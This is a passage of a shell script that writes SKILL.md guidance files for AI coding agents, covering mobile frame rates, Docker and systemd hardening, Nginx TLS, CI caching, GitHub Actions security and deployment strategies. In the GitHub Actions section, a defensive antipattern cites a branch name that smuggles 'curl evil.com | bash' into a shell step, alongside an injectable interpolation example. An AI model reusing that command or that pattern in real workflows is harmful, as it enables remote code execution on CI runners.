- Missing indexes on foreign key columns, causing child table scans whenever parent records are modified.

## Concrete Real-World Example
Scenario: A customer transactions table with 15 million rows takes 14 seconds to load page 50 of transaction history using `OFFSET 1000`.
Prompt: Optimize this slow transaction pagination query.
Application: The AI replaces `OFFSET 1000 LIMIT 20` with keyset cursor pagination `WHERE (created_at, id) < (:last_date, :last_id) ORDER BY created_at DESC, id DESC LIMIT 20`, backed by a composite index `(created_at DESC, id DESC)`, dropping query execution time from 14 seconds to 3 milliseconds.
EOF

cat << 'EOF' > skills/performance/mobile/frame-rate-and-battery-budgeting/SKILL.md
---
name: "frame-rate-and-battery-budgeting"
description: "Optimizing mobile application rendering to achieve consistent 60/120 FPS, eliminating UI thread jank, reducing overdraw, and conserving device battery life."
category: "performance"
subcategory: "mobile"
language: "agnostic"
framework: "none"
technology: "mobile-performance"
difficulty: "advanced"
tags: ["performance", "mobile", "fps", "jank", "battery", "overdraw", "profiling"]
---

# Mobile Frame Rate (60/120 FPS) and Battery Budget Optimization

## Purpose
Provide AI agents with concrete techniques for eliminating frame drops, eliminating main-thread jank, minimizing GPU overdraw, and preserving battery life on mobile devices.

## When to Use
Use when optimizing React Native, Flutter, Android, or iOS mobile applications with stuttering list scrolling, high CPU drain, or rapid battery depletion.

## Inputs / Context
Mobile UI layout, rendering profiling traces (Systrace, Android Studio Profiler, Instruments), list virtualization configs, and background task schedules.

## Instructions
1. Adhere to the 16ms / 8ms Frame Budget:
   - For standard 60Hz displays, all UI thread rendering work must complete within 16.6ms per frame.
   - For high-refresh 120Hz displays (ProMotion), work must complete within 8.3ms per frame.
   - Any frame taking longer causes a visible visual stutter (Jank / Dropped Frame).
2. Offload Non-UI Work from the Main Thread:
   - Never parse large JSON payloads, serialize complex models, or execute cryptographic operations on the main UI thread.
   - Offload heavy tasks to background worker threads, Kotlin Coroutines (`Dispatchers.Default`), or React Native native modules.
3. Optimize List Virtualization:
   - Always virtualize dynamic lists (`RecyclerView` in Android, `FlatList` with `getItemLayout` in React Native, `ListView.builder` in Flutter).
   - Recycle views and avoid creating new component instances or allocating new closures during fast scrolling.
4. Minimize GPU Overdraw:
   - Inspect overdraw: ensure pixels are not drawn multiple times in a single frame due to stacked opaque background colors on parent containers.
   - Remove redundant container backgrounds.
5. Conserve Battery Life:
   - Avoid continuous polling; use push notifications (FCM/APNs) for remote updates.
   - Batch background location and network requests using system job schedulers (WorkManager on Android, BGTaskScheduler on iOS).
   - Cease all animations, timers, and sensor listeners immediately when the mobile screen or activity enters the background.

## Constraints / Rules
- Never execute file I/O or network requests on the mobile UI thread.
- Avoid nesting scrollable containers within scrollable containers without fixed constraints.
- Do not keep GPS location sensors active at high accuracy when the app is backgrounded.

## Workflow
1. Profile scrolling performance using mobile profilers to measure dropped frames.
2. Identify overdraw hotspots and strip unnecessary background colors.
3. Configure list virtualization with precomputed item heights.
4. Move JSON parsing and heavy business transformations to background workers.
5. Audit background services to ensure compliance with OS battery saver policies.

## Expected Output
High-performance mobile UI code delivering smooth 60/120 FPS scrolling, minimal overdraw, and battery-friendly background task scheduling.

## Validation Checklist
- [ ] Are all list views properly virtualized and recycled?
- [ ] Is the main UI thread completely free of blocking I/O and heavy parsing?
- [ ] Is overdraw minimized to <= 1x across all screen regions?
- [ ] Are animations paused when views are off-screen or backgrounded?
- [ ] Are background tasks scheduled using WorkManager or BGTaskScheduler?

## Common Mistakes & Antipatterns
- Rendering an unbounded list of 500 cards in a standard `ScrollView` instead of a virtualized list, crashing the mobile app with an Out-Of-Memory error.
- Setting opaque background colors on 5 nested parent containers, forcing the mobile GPU to render the same pixel 5 times per frame.
- Leaving a high-frequency GPS or timer loop running after the user minimizes the app, draining 20% of battery in an hour.

## Concrete Real-World Example
Scenario: A mobile product catalog stutters severely during scrolling on Android devices, dropping down to 18 FPS and heating up the device.
Prompt: Optimize this mobile catalog list to achieve butter-smooth 60 FPS scrolling and reduce battery consumption.
Application: The AI migrates the list to a virtualized `FlatList` with `getItemLayout` for instantaneous scroll calculations, removes redundant nested view backgrounds to eliminate 3x overdraw, offloads image decoding, and memoizes list item renderers with `React.memo`, restoring smooth 60 FPS scrolling.
EOF

cat << 'EOF' > skills/devops/docker/multi-stage-minimal-images/SKILL.md
---
name: "multi-stage-minimal-images"
description: "Constructing secure, lightweight multi-stage Dockerfiles utilizing Alpine or distroless base images, non-root users, build cache mounts, and minimal attack surfaces."
category: "devops"
subcategory: "docker"
language: "dockerfile"
framework: "none"
technology: "docker"
difficulty: "intermediate"
tags: ["devops", "docker", "containers", "multi-stage", "distroless", "security", "hardening"]
---

# Multi-Stage Dockerfiles, Security Hardening, and Minimal Images

## Purpose
Instruct AI agents to author enterprise-grade Dockerfiles that shrink container image sizes from gigabytes to megabytes, accelerate build pipelines, and enforce zero-root container security.

## When to Use
Use when containerizing applications for production, optimizing slow Docker build times, or remediating container security scan vulnerabilities.

## Inputs / Context
Application source code, runtime dependencies, build tools, package manager, and exposed ports.

## Instructions
1. Structure Dockerfiles with Multi-Stage Builds:
   - Stage 1 (Builder): Use a full SDK/toolchain image to compile dependencies and binaries.
   - Stage 2 (Runner): Copy only the final compiled artifact and production runtime dependencies into a minimal, stripped runner image (such as `gcr.io/distroless` or `alpine`).
2. Run as a Non-Root User:
   - Never run container processes as the default `root` user (UID 0).
   - Create an explicit system user and group (e.g., `RUN addgroup -S appgroup && adduser -S appuser -G appgroup`) and declare `USER appuser` before the entrypoint.
3. Optimize Layer Caching with BuildKit Cache Mounts:
   - Leverage `RUN --mount=type=cache,target=/root/.cache` or `/root/.npm` to persist package manager caches between CI builds.
   - Copy dependency definition manifests (`package.json`, `go.mod`, `pom.xml`, `requirements.txt`) and install dependencies BEFORE copying the rest of application source code.
4. Minimize Image Attack Surface:
   - Eliminate build tools, package managers (`apk`, `apt`), compilers, and shell binaries (`/bin/sh`, `/bin/bash`) from the final runtime container.
5. Handle Process Lifecycle (`PID 1`) and Zombie Reaping:
   - Use `dumb-init` or Tini (`ENTRYPOINT ["tini", "--", "..."]`) to properly forward OS signals (`SIGTERM`, `SIGINT`) and reap zombie child processes if not using a system orchestrator.
6. Configure Container Health Checks:
   - Define a native `HEALTHCHECK` instruction to verify process readiness without external agents.
7. Include `.dockerignore`: Exclude `node_modules`, `.git`, `.env`, build artifacts, and test files.

## Constraints / Rules
- Never commit or run containers as `root` in production.
- Never include secret API keys, credentials, or `.env` files in Docker images; use BuildKit secret mounts (`--mount=type=secret`).
- Avoid using the `latest` tag in `FROM` directives; pin specific SHA digests or semantic versions.

## Workflow
1. Draft `.dockerignore` to exclude local artifacts and secrets.
2. Author Stage 1 (Builder) installing build dependencies and compiling code.
3. Author Stage 2 (Runner) using a minimal distroless/alpine base.
4. Create and switch to non-root user.
5. Add PID 1 init process wrapper and healthcheck instruction.
6. Scan final image with Trivy to verify zero critical/high CVEs.

## Expected Output
Hardened, multi-stage Dockerfile producing a minimal, non-root, production-ready container image.

## Validation Checklist
- [ ] Does the Dockerfile use multi-stage builds?
- [ ] Does the final image run as an unprivileged non-root user?
- [ ] Are build tools and package managers excluded from the runner image?
- [ ] Is `.dockerignore` defined to exclude `.git` and secrets?
- [ ] Does vulnerability scanning (Trivy/Snyk) report 0 critical CVEs?

## Common Mistakes & Antipatterns
- Copying the entire project directory (`COPY . .`) before running `npm install` or `pip install`, completely invalidating Docker's layer cache on every minor code edit.
- Leaving compiler tools (`gcc`, `python3-dev`, `make`) in the final production container, bloating image size by 800MB and introducing CVEs.
- Running Node.js or Python directly as PID 1, preventing the container from responding to `SIGTERM` signals and causing 10-second delays on every deployment.

## Concrete Real-World Example
Scenario: A Node.js Docker image is 1.4 GB in size, runs as root, and contains 45 known CVE vulnerabilities due to leftover build packages.
Prompt: Optimize and harden this Node.js Dockerfile into a production-ready, minimal container.
Application: The AI creates a multi-stage Dockerfile using Alpine, installs dependencies with cache mounts, builds the output, copies only `/app/dist` and production node_modules into a minimal Distroless image, assigns an unprivileged `appuser`, and configures `dumb-init`, shrinking image size to 85MB with 0 CVEs.
EOF

cat << 'EOF' > skills/devops/linux/systemd-service-hardening/SKILL.md
---
name: "systemd-service-hardening"
description: "Authoring production Linux systemd unit files with automatic restart policies, journald structured logging, resource limits, and filesystem sandboxing."
category: "devops"
subcategory: "linux"
language: "ini"
framework: "systemd"
technology: "linux"
difficulty: "intermediate"
tags: ["devops", "linux", "systemd", "hardening", "security", "sysadmin", "sandboxing"]
---

# Linux Systemd Service Architecture and Sandboxed Hardening

## Purpose
Provide concrete rules for deploying backend daemons and services on Linux using robust systemd service units with advanced security sandboxing.

## When to Use
Use when configuring standalone Linux servers, virtual machines, cloud instances, or background daemons.

## Inputs / Context
Binary executable path, working directory, environment files, user accounts, and sandboxing requirements.

## Instructions
1. Structure Unit File into Standard Sections: `[Unit]`, `[Service]`, and `[Install]`.
2. Configure Resilient Process Lifecycles:
   - `Type=simple` (or `notify` if the binary supports sd_notify).
   - `Restart=always` with `RestartSec=5s` to automatically recover from crashes without overwhelming the system in an infinite crash loop.
3. Run as Dedicated Service User:
   - Define dedicated unprivileged system account: `User=appuser`, `Group=appgroup`.
   - Never run systemd services as `root`.
4. Enforce System Sandboxing (Defense-in-Depth):
   - `ProtectSystem=strict`: Mounts `/usr`, `/boot`, `/etc` as read-only for the service.
   - `ProtectHome=true`: Completely hides `/home`, `/root`, and `/run/user` from the service.
   - `PrivateTmp=true`: Gives the process its own isolated `/tmp` directory, preventing symlink attacks.
   - `NoNewPrivileges=true`: Prevents child processes from gaining elevated privileges via setuid binaries.
   - `ProtectKernelTunables=true`, `ProtectControlGroups=true`: Prevents the daemon from altering kernel parameters.
   - `RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX`: Restricts network communication to IPv4, IPv6, and Unix sockets.
5. Manage Environment and Secrets:
   - Load environment configuration via `EnvironmentFile=/etc/default/myservice` with file permissions `0600`.
6. Enforce Resource Limits:
   - Configure CPU and memory limits: `MemoryMax=2G`, `CPUQuota=200%`, `LimitNOFILE=65535`.

## Constraints / Rules
- Never write systemd unit files that execute binaries directly as `root` without strict justification.
- Avoid setting `Restart=always` without a reasonable `RestartSec` backoff.
- Do not store plaintext passwords or secrets directly inside the `.service` unit file; use restricted `EnvironmentFile` or systemd credentials.

## Workflow
1. Create unprivileged system user and group.
2. Draft `/etc/systemd/system/myservice.service` with sandboxing parameters.
3. Set secure permissions on environment configuration files (`chmod 600`).
4. Reload systemd daemon: `systemctl daemon-reload`.
5. Enable and start service: `systemctl enable --now myservice`.
6. Audit security score using `systemd-analyze security myservice`.

## Expected Output
Production systemd `.service` unit file featuring process isolation, sandboxing directives, resource quotas, and journald logging.

## Validation Checklist
- [ ] Is the service configured with a non-root dedicated `User`?
- [ ] Are sandboxing directives (`ProtectSystem=strict`, `PrivateTmp=true`, `NoNewPrivileges=true`) enabled?
- [ ] Is `Restart=always` configured with a sensible backoff?
- [ ] Are file descriptor limits (`LimitNOFILE`) right-sized?
- [ ] Does `systemd-analyze security` report a low exposure score?

## Common Mistakes & Antipatterns
- Running custom web services as `root`, meaning a single remote code execution vulnerability immediately grants root access to the entire host.
- Leaving `PrivateTmp=false`, allowing compromised services to inspect temporary files generated by other system processes.
- Omitting `LimitNOFILE`, causing high-traffic servers to crash with `Too many open files` errors under load.

## Concrete Real-World Example
Scenario: A Python web service running on an Ubuntu EC2 instance runs as root and crashes permanently whenever an uncaught exception occurs.
Prompt: Author a production systemd service file for this Python web app with auto-restart and security sandboxing.
Application: The AI authors `web-app.service` assigning `User=webapp`, `Restart=always`, `RestartSec=3s`, applies `ProtectSystem=strict` with `ReadWritePaths=/var/log/webapp`, configures `PrivateTmp=true`, sets memory cap at 1GB, and verifies systemd service health.
EOF

cat << 'EOF' > skills/devops/nginx/reverse-proxy-and-ssl-hardening/SKILL.md
---
name: "reverse-proxy-and-ssl-hardening"
description: "Configuring high-performance Nginx reverse proxies with modern TLS 1.3 encryption, HTTP/2, buffer tuning, rate limiting, and security headers."
category: "devops"
subcategory: "nginx"
language: "nginx"
framework: "none"
technology: "nginx"
difficulty: "intermediate"
tags: ["devops", "nginx", "reverse-proxy", "ssl", "tls", "http2", "security-headers"]
---

# Nginx Reverse Proxy Architecture and SSL/TLS Hardening

## Purpose
Instruct AI agents to author production-ready, security-hardened Nginx configurations providing high-throughput reverse proxying, modern TLS ciphers, and DDoS mitigation.

## When to Use
Use when configuring edge web servers, SSL termination proxies, API gateways, load balancers, or static asset caches.

## Inputs / Context
Backend upstream servers, domain names, SSL certificate paths, rate limit thresholds, and caching policies.

## Instructions
1. Modern SSL/TLS Hardening (Mozilla Intermediate/Modern Guideline):
   - Restrict protocols to `TLSv1.2 TLSv1.3`; disable obsolete SSLv3, TLS 1.0, and TLS 1.1.
   - Use high-security cipher suites prioritizing forward secrecy (ECDHE).
   - Configure SSL session caching: `ssl_session_cache shared:SSL:10m; ssl_session_timeout 1d; ssl_session_tickets off;`.
   - Enable OCSP Stapling: `ssl_stapling on; ssl_stapling_verify on; resolver 1.1.1.1 8.8.8.8;`.
2. Enable HTTP/2 Protocol: Include `http2` in the `listen 443 ssl` directive.
3. Enforce Strict Security Headers:
   - `add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;`
   - `add_header X-Content-Type-Options "nosniff" always;`
   - `add_header X-Frame-Options "DENY" always;`
   - `add_header Referrer-Policy "strict-origin-when-cross-origin" always;`
4. Reverse Proxy Header Propagation:
   - Always propagate client IP and proto:
     `proxy_set_header Host $host;`
     `proxy_set_header X-Real-IP $remote_addr;`
     `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;`
     `proxy_set_header X-Forwarded-Proto $scheme;`
5. Configure Upstream Connection Keep-Alive:
   - Maintain a pool of persistent connections to backend servers (`keepalive 32;` inside `upstream` block) and set `proxy_http_version 1.1; proxy_set_header Connection "";`.
6. Implement Edge Rate Limiting:
   - Configure `limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;` and apply `limit_req zone=api_limit burst=20 nodelay;` on API routes.

## Constraints / Rules
- Never enable legacy SSLv2, SSLv3, TLS 1.0, or TLS 1.1.
- Never forward proxy requests without resetting the `Connection ""` header when using HTTP/1.1 keep-alives.
- Do not expose Nginx version numbers; set `server_tokens off;`.

## Workflow
1. Author global Nginx configuration with worker process auto-tuning.
2. Define upstream block with persistent keep-alive connections.
3. Configure HTTP to HTTPS 301 redirection block.
4. Configure HTTPS server block with TLS 1.3, security headers, and reverse proxy settings.
5. Test configuration syntax: `nginx -t`.
6. Reload Nginx without downtime: `nginx -s reload`.

## Expected Output
Production Nginx configuration file (`nginx.conf`) featuring TLS 1.3, HTTP/2, reverse proxy header forwarding, keep-alive pooling, and rate limiting.

## Validation Checklist
- [ ] Are obsolete TLS protocols disabled (TLS 1.2+ only)?
- [ ] Is HTTP/2 enabled on port 443?
- [ ] Are client IPs correctly forwarded via `X-Forwarded-For`?
- [ ] Is HSTS and standard security headers configured?
- [ ] Does `nginx -t` validate with zero syntax warnings?

## Common Mistakes & Antipatterns
- Omitting `proxy_set_header Connection ""` when proxying HTTP/1.1, causing Nginx to close upstream connections on every single request instead of reusing them.
- Leaving `server_tokens on;`, leaking exact Nginx version information in HTTP headers to potential attackers.
- Forgetting to configure an HTTP-to-HTTPS redirect, leaving unencrypted HTTP traffic open.

## Concrete Real-World Example
Scenario: An Nginx proxy drops client IP addresses, exposes internal backend server ports, and suffers from connection overhead under high load.
Prompt: Write a hardened, high-performance Nginx configuration for proxying traffic to a backend cluster on port 3000.
Application: The AI creates an upstream block with `keepalive 64`, sets `server_tokens off`, enforces modern TLS 1.3 ciphers, adds HSTS and CSP headers, forwards `X-Real-IP` and `X-Forwarded-For`, and configures an edge rate-limiting zone with burst handling.
EOF

cat << 'EOF' > skills/devops/ci-cd/pipeline-caching-and-failfast/SKILL.md
---
name: "pipeline-caching-and-failfast"
description: "Designing high-speed, cost-effective CI/CD pipelines utilizing granular cache keys, parallel job matrixes, fail-fast order, and artifact management."
category: "devops"
subcategory: "ci-cd"
language: "yaml"
framework: "none"
technology: "ci-cd"
difficulty: "intermediate"
tags: ["devops", "ci-cd", "caching", "fail-fast", "automation", "testing"]
---

# CI/CD Pipeline Optimization, Caching, and Fail-Fast Strategies

## Purpose
Guide AI in designing high-efficiency continuous integration and deployment pipelines that cut build times by 70%, eliminate redundant job runs, and fail fast on early defects.

## When to Use
Use when designing CI pipelines (GitHub Actions, GitLab CI, CircleCI), speeding up slow test suites, or reducing CI runner compute costs.

## Inputs / Context
Project build tools, test suites, deployment stages, dependency lockfiles, and target environments.

## Instructions
1. Order Jobs by Speed and Failure Likelihood (Fail-Fast Hierarchy):
   - Step 1: Linters, Static Type Checks, and Format Verification (< 1 minute).
   - Step 2: Fast Unit Tests (< 2 minutes).
   - Step 3: Integration Tests and Security Scans (< 5 minutes).
   - Step 4: Heavy E2E Browser Tests and Docker Builds.
   - Fail early: Stop pipeline execution immediately upon the first failure to conserve runner minutes.
2. Implement Deterministic Dependency Caching:
   - Cache dependencies based on cryptographic lockfile hashes: `key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}`.
   - Use fallback restore-keys: `${{ runner.os }}-node-` to allow partial cache hits when lockfiles change.
3. Parallelize Workloads using Build Matrices:
   - Split large test suites into parallel shards (e.g., matrix of 4 shards running `vitest --shard=1/4`, `2/4`, etc.).
   - Test across multiple OS or language runtime versions concurrently.
4. Build Once, Deploy Everywhere:
   - Compile code and build container images exactly once in the build stage.
   - Save build artifacts or push image with immutable commit SHA tag; deploy the identical artifact across Staging and Production.
5. Concurrency Control and Cancellation:
   - Cancel outdated in-flight builds when new commits are pushed to the same pull request branch (`concurrency: { group: ..., cancel-in-progress: true }`).

## Constraints / Rules
- Never rebuild application source code separately in staging and production deployment steps.
- Avoid caching build directories without checking lockfile hashes.
- Do not run slow E2E tests before verifying basic syntax and unit test correctness.

## Workflow
1. Define pipeline trigger filters (branch paths, PR events).
2. Configure concurrency cancellation for PRs.
3. Set up dependency cache with lockfile hashing.
4. Execute lint and unit test stages in parallel.
5. Build and archive production artifacts.
6. Execute integration and deployment stages conditionally.

## Expected Output
High-efficiency CI/CD pipeline definition with deterministic dependency caching, fail-fast staging, and parallelized test matrices.

## Validation Checklist
- [ ] Are jobs sequenced from fastest to slowest?
- [ ] Is dependency caching keyed to lockfile hash?
- [ ] Are redundant pending builds cancelled automatically on new pushes?
- [ ] Is application code built once and promoted across environments?
- [ ] Is the pipeline execution time under 5-10 minutes?

## Common Mistakes & Antipatterns
- Downloading all dependencies from the internet from scratch on every commit without caching, wasting 5 minutes per build.
- Running full 20-minute E2E tests on a commit that failed the basic TypeScript linter in the first 10 seconds.
- Re-running CI on the master branch when only a `.md` documentation file was updated.

## Concrete Real-World Example
Scenario: A team's CI pipeline takes 25 minutes per pull request because it installs dependencies from scratch, runs sequential tests, and doesn't cancel superseded commits.
Prompt: Optimize this GitHub Actions CI pipeline for speed and cost efficiency.
Application: The AI adds `concurrency: { cancel-in-progress: true }`, keys npm caching to `package-lock.json`, parallelizes linting and unit tests, shards E2E tests across 3 matrix runners, cutting total CI run time from 25 minutes down to 4 minutes.
EOF

cat << 'EOF' > skills/devops/github-actions/secure-reusable-workflows/SKILL.md
---
name: "secure-reusable-workflows"
description: "Authoring secure, modular GitHub Actions workflows utilizing `workflow_call`, explicit least-privilege permissions, commit SHA pinning, and OIDC cloud authentication."
category: "devops"
subcategory: "github-actions"
language: "yaml"
framework: "github-actions"
technology: "github-actions"
difficulty: "advanced"
tags: ["devops", "github-actions", "security", "oidc", "reusable-workflows", "least-privilege"]
---

# Secure Reusable GitHub Actions and Supply Chain Security

## Purpose
Instruct AI agents to author enterprise-grade GitHub Actions workflows that prevent supply chain attacks, enforce minimal GITHUB_TOKEN permissions, and eliminate static cloud credentials.

## When to Use
Use when standardizing CI/CD workflows across multiple repositories, creating reusable workflow templates, or securing GitHub Actions pipelines against supply chain threats.

## Inputs / Context
Workflow triggers, required inputs/secrets, cloud provider integration (AWS/GCP/Azure), and target branch protections.

## Instructions
1. Enforce Principle of Least Privilege on `GITHUB_TOKEN`:
   - Always declare top-level `permissions: {}` (default to read-only or no permissions).
   - Explicitly grant minimal permissions required per job (e.g., `permissions: { contents: read, pull-requests: write }`).
2. Pin Third-Party Actions to Full Immutable Commit SHAs:
   - Never use mutable tags like `uses: actions/checkout@v4` or `@main` in security-critical environments; compromised tags allow supply chain attacks.
   - Use full 40-character commit SHAs with a descriptive comment: `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1`.
3. Eliminate Long-Lived Static Cloud Secrets using OIDC:
   - Never store long-lived AWS Access Keys or GCP service account JSON in repository secrets.
   - Use OpenID Connect (OIDC) with `permissions: { id-token: write, contents: read }` to assume temporary, scoped cloud IAM roles dynamically.
4. Architect Modular Reusable Workflows (`workflow_call`):
   - Define shared CI/CD pipelines in `.github/workflows/reusable-*.yml` triggered via `on: workflow_call`.
   - Explicitly declare typed `inputs` (string, boolean) and `secrets` (inherited or named).
5. Guard Against Script Injection:
   - Never interpolate untrusted user inputs (like PR titles, commit messages, or issue bodies) directly into `run:` shell commands (e.g., `run: echo "${{ github.event.issue.title }}"` is a severe injection vulnerability).
   - Pass untrusted values safely via intermediate environment variables: `env: { TITLE: ${{ github.event.issue.title }} } run: echo "$TITLE"`.

## Constraints / Rules
- Never grant `permissions: write-all` on GitHub Actions workflows.
- Never interpolate GitHub context expressions (`${{ github.event... }}`) directly into inline bash scripts.
- Do not store permanent cloud administrator credentials in repository secrets.

## Workflow
1. Define top-level minimal permissions.
2. Structure reusable workflow with `workflow_call` trigger and typed inputs.
3. Pin all third-party actions to 40-character commit SHAs.
4. Configure OIDC role assumption for cloud deployments.
5. Pass dynamic context into scripts strictly through environment variables.

## Expected Output
Secure, reusable GitHub Actions workflow YAML featuring commit SHA pinning, OIDC authentication, and zero script injection vectors.

## Validation Checklist
- [ ] Are permissions explicitly declared and scoped to least privilege?
- [ ] Are external actions pinned to 40-character commit SHAs?
- [ ] Is cloud authentication handled via short-lived OIDC tokens?
- [ ] Are context variables passed via `env` blocks rather than inline script interpolation?
- [ ] Is the workflow parameterized for reuse via `workflow_call`?

## Common Mistakes & Antipatterns
- Writing `run: echo "Processing branch ${{ github.head_ref }}"`, allowing an attacker to submit a PR with a branch named `main; curl evil.com | bash` and achieve remote code execution.
- Storing permanent AWS root credentials in GitHub Secrets that never expire or rotate.
- Allowing all jobs to inherit default unrestricted read/write permissions on the repository.

## Concrete Real-World Example
Scenario: A team's deploy workflow interpolates the commit message directly into a bash command and uses permanent AWS access keys.
Prompt: Secure this GitHub Actions deployment workflow against script injection and migrate to OIDC.
Application: The AI declares `permissions: { id-token: write, contents: read }`, replaces static AWS keys with `aws-actions/configure-aws-credentials` using OIDC role assumption, pins actions to commit SHAs, and moves commit messages into an `env` block before echoing.
EOF

cat << 'EOF' > skills/devops/deployment/blue-green-and-canary-rollouts/SKILL.md
---
name: "blue-green-and-canary-rollouts"
description: "Architecting zero-downtime deployment pipelines using Blue-Green switching, Canary traffic shifting, automated metric analysis, and instant rollback gates."
category: "devops"
subcategory: "deployment"
language: "agnostic"
framework: "none"
technology: "deployment-strategies"
difficulty: "advanced"
tags: ["devops", "deployment", "blue-green", "canary", "zero-downtime", "rollbacks", "kubernetes"]
---

# Zero-Downtime Blue-Green and Canary Deployment Strategies

## Purpose
Provide AI agents with rigorous deployment patterns to release application updates with zero downtime, gradual risk exposure, automated metric validation, and sub-second rollbacks.

## When to Use
Use when releasing mission-critical services, orchestrating Kubernetes deployments, configuring load balancers, or architecting continuous delivery pipelines.

## Inputs / Context
Current production environment (Blue), new release artifact (Green), load balancer / ingress router, health criteria, and rollback triggers.

## Instructions
1. BLUE-GREEN DEPLOYMENT:
   - Maintain two identical production environments: Blue (active live traffic) and Green (idle staging environment).
   - Deploy the new application version to Green.
   - Run end-to-end smoke tests and synthetic health checks against Green while real users remain entirely on Blue.
   - Cutover: Update the edge router, load balancer, or DNS to switch 100% of live traffic from Blue to Green instantly.
   - Rollback: If critical errors occur post-cutover, immediately flip the router back to Blue within seconds.
   - Decommission or put old Blue on standby once Green proves stable.
2. CANARY DEPLOYMENT:
   - Deploy the new version to a small Canary instance pool receiving 2-5% of live traffic.
   - Automated Canary Analysis (ACA): Monitor error rates (HTTP 5xx), P99 latency, and crash loops between Canary and Baseline over 15-30 minutes.
   - Progressive Rollout: Gradually increase traffic (5% -> 25% -> 50% -> 100%) if metrics remain within acceptable SLA thresholds.
   - Instant Rollback: Automatically abort rollout and route 100% of traffic back to Baseline if error rate spikes above threshold (e.g., > 1%).
3. Backward and Forward Database Schema Compatibility:
   - All database migrations during zero-downtime deployments must follow the Expand and Contract (Parallel Run) pattern.
   - The database must simultaneously support both the old version (Blue) and new version (Green) during the transition period.

## Constraints / Rules
- Never apply breaking database schema changes (e.g., dropping or renaming a column) simultaneously with an application deployment.
- Never switch 100% of traffic to a new version without verified smoke test execution on the new environment.
- Do not dismantle the previous deployment environment until the new release has run stably under live load.

## Workflow
1. Deploy new version to isolated Green/Canary environment.
2. Execute automated synthetic smoke tests against target endpoints.
3. Shift 5% of production traffic to Canary.
4. Evaluate Prometheus/CloudWatch metrics (HTTP 5xx, P99 latency) for 15 minutes.
5. If metrics pass, complete rollout to 100%; if metrics degrade, trigger immediate rollback.
6. Keep previous stable version warm for 1 hour post-deployment.

## Expected Output
Zero-downtime deployment orchestration specification featuring automated smoke validation, canary traffic increment gates, and metric-based rollback rules.

## Validation Checklist
- [ ] Are synthetic smoke tests verified before routing live traffic?
- [ ] Is canary traffic incremented gradually with automated metric evaluation?
- [ ] Is rollback automated upon error rate or latency threshold breach?
- [ ] Is database schema backward-compatible with both versions?
- [ ] Does live user traffic experience zero dropped connections during cutover?

## Common Mistakes & Antipatterns
- Renaming a database column in the same deployment step, causing the old version to immediately crash while the new version is still booting up.
- Switching 100% of traffic to Green without testing Green's connectivity to databases and internal services.
- Relying on manual human observation to decide whether to roll back instead of automated metric monitoring.

## Concrete Real-World Example
Scenario: A fintech platform experiences an outage during deployment because a bug in a new microservice release is deployed to all servers at once.
Prompt: Design a Canary deployment pipeline with automated rollback for this service on Kubernetes.
Application: The AI configures an Argo Rollouts canary strategy starting at 5% traffic weight for 10 minutes, sets an automated analysis template monitoring Prometheus HTTP 5xx error percentage (< 0.5%), promotes to 20%, 50%, and 100% upon success, and aborts to the baseline revision automatically if errors exceed 1%.
EOF

cat << 'EOF' > skills/mobile/android/kotlin/coroutine-lifecycle-architecture/SKILL.md
---
name: "coroutine-lifecycle-architecture"
description: "Architecting modern Android apps in Kotlin using structured concurrency, viewModelScope, StateFlow, lifecycle-aware collection with repeatOnLifecycle, and safe dispatchers."
category: "mobile"
subcategory: "android/kotlin"
language: "kotlin"
framework: "android"
technology: "kotlin-coroutines"
difficulty: "advanced"
tags: ["mobile", "android", "kotlin", "coroutines", "stateflow", "lifecycle", "architecture"]
---

# Android Kotlin Coroutines, StateFlow, and Lifecycle Scopes

## Purpose
Instruct AI agents to author leak-free, lifecycle-aware Android applications in Kotlin leveraging structured concurrency and reactive StateFlow.

## When to Use
Use when building modern Android applications, asynchronous data loaders, network clients, Room database queries, or UI state management.

## Inputs / Context
UI state model, asynchronous repository calls, Android ViewModel, Activity/Fragment lifecycle, and error boundaries.

## Instructions
1. Practice Structured Concurrency:
   - Always launch coroutines inside appropriate lifecycle scopes: use `viewModelScope` inside ViewModels; never use `GlobalScope`.
   - Ensure child coroutine cancellations propagate cleanly without leaking background operations.
2. Expose UI State via `StateFlow`:
   - Keep mutable state private within the ViewModel (`private val _uiState = MutableStateFlow<UiState>(UiState.Initial)`).
   - Expose read-only state to the UI layer (`val uiState: StateFlow<UiState> = _uiState.asStateFlow()`).
3. Safe Lifecycle-Aware Flow Collection in UI:
   - In Activities/Fragments, always collect flows using `lifecycleScope.launch { repeatOnLifecycle(Lifecycle.State.STARTED) { uiState.collect { ... } } }`.
   - In Jetpack Compose, use `collectAsStateWithLifecycle()` to safely pause collection when the app is in the background.
4. Select the Right Dispatcher:
   - `Dispatchers.Main`: UI updates, small quick operations.
   - `Dispatchers.IO`: Disk reads/writes, network requests, database transactions.
   - `Dispatchers.Default`: CPU-intensive computations (JSON parsing, sorting, image processing).
   - Use `withContext(Dispatchers.IO)` inside repository methods to ensure suspend functions are main-safe.
5. Handle Exceptions with `CoroutineExceptionHandler` and `runCatching`:
   - Catch domain exceptions gracefully and emit error UI states rather than crashing the process.

## Constraints / Rules
- Never use `GlobalScope.launch` in Android applications.
- Never collect flows in the UI using standard `lifecycleScope.launch` without `repeatOnLifecycle`, as this keeps collecting in the background and drains battery.
- Never perform blocking I/O calls on `Dispatchers.Main`.

## Workflow
1. Define sealed interface representing UI State (`Loading`, `Success`, `Error`).
2. Implement ViewModel with `MutableStateFlow` and `asStateFlow()`.
3. Launch repository calls within `viewModelScope` with `withContext(Dispatchers.IO)`.
4. Collect state in UI using `repeatOnLifecycle(Lifecycle.State.STARTED)`.
5. Write unit tests using `runTest` and `StandardTestDispatcher`.

## Expected Output
Clean Kotlin ViewModel and UI integration code featuring StateFlow, main-safe suspend functions, and lifecycle-aware collection.

## Validation Checklist
- [ ] Is `viewModelScope` utilized for launching ViewModel coroutines?
- [ ] Is UI state exposed as read-only `StateFlow`?
- [ ] Is `repeatOnLifecycle` or `collectAsStateWithLifecycle` used for UI collection?
- [ ] Are suspend functions main-safe via `withContext(Dispatchers.IO)`?
- [ ] Are coroutines tested using `runTest`?

## Common Mistakes & Antipatterns
- Using `GlobalScope.launch`, causing network requests to continue running even after the user has permanently closed the Activity.
